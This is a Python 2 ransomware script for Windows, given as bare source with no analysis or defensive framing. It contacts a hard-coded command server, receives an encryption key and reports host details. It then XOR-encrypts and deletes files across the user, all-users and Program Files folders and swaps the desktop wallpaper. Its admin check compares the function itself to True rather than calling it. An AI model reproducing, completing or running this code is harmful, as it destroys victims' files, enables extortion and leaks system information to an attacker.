#!/usr/bin/python2
#-*- coding:utf-8 -*-


import socket
import os
import win32con
import getpass
import threading
import base64
from itertools import cycle, izip
import urllib
import sys
import ctypes
import time
import platform
import win32ui

SERVER_IP = "192.168.1.71"
SERVER_PORT = 4444

TARGET_USER = getpass.getuser()
USER_PATH_DESKTOP = "c:/users/%s/" % (TARGET_USER)
ALL_USER_PATH = "c:/users/"
PROG_PATH = "c:/program files"
WALLPAPER_LINK = "http://getwallpapers.com/wallpaper/full/4/a/4/8277.jpg"


def platform_required():
    if 'Windows' not in platform.platform():
        sys.exit("[*] Windows Required !")


def runasadmin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        return False


def send_msgbox(message,title):
    win32ui.MessageBox(message,title)



def change_wallpaper(link):
    name = 'wlp.jpg'
    urllib.urlretrieve(link,name)
    path_current_1 = os.getcwd()
    path_1 = path_current_1+"\\wlp.jpg"
    changed = win32con.SPIF_UPDATEINFILE | win32con.SPIF_SENDCHANGE
    ctypes.windll.user32.SystemParametersInfoA(win32con.SPI_SETDESKWALLPAPER,0,path_1.encode(),changed)
    time.sleep(2)
    os.remove('wlp.jpg')

def xor_crypt(data, key, encode=False, decode=False):
    if decode:
        data = base64.decodestring(data)
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
    if encode:
        return base64.encodestring(xored).strip()
    
    return xored

def encrypt_file(filename,KEY):
    if filename == sys.argv[0]:
        pass

    elif filename.endswith(".encrypted")==True:
        pass

    else:
        check_file_exists = os.path.exists(filename)
        if check_file_exists ==True:
            f=open(filename,"rb")
            content = f.read()
            f.close()
            enc = xor_crypt(content,KEY,encode=True)
            replace_content = content.replace(content,enc)
            f=open(filename+".encrypted","wb")
            f.write(replace_content)
            f.close()
            os.remove(filename)
            return True
        else:
            return False


def start_encryptions(path,KEY):
    for root, dirs, files in os.walk(path):
        for file in files:
            path = os.path.join(root,file)
            try:
                encrypt_f = encrypt_file(path,KEY)
                if encrypt_f ==True:
                    print("[*] Encrypted => %s" % (path))
                else:
                    print("[*] Not Encrypted => %s" % (path))
            except:
                pass


if __name__ == '__main__':
    platform_required()
    if runasadmin ==True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((SERVER_IP,SERVER_PORT))
            info_platform = " ".join(platform.uname())
            hostname = platform.node()
            KEY = s.recv(4096)
            s.send("[*] Informations of %s :\n%s" % (hostname,info_platform))
            t1 = threading.Thread(target=start_encryptions,args=(USER_PATH_DESKTOP,KEY))
            t1.start()
            t2 = threading.Thread(target=start_encryptions,args=(PROG_PATH,KEY))
            t2.start()
            t3 = threading.Thread(target=start_encryptions,args=(ALL_USER_PATH,KEY))
            t3.start()
            change_wallpaper(WALLPAPER_LINK)
            s.close()
        except:
            print("[*] Error Connect To Server !")
    else:
        send_msgbox("Error Please Run This With Administrator Privilege !","Error")
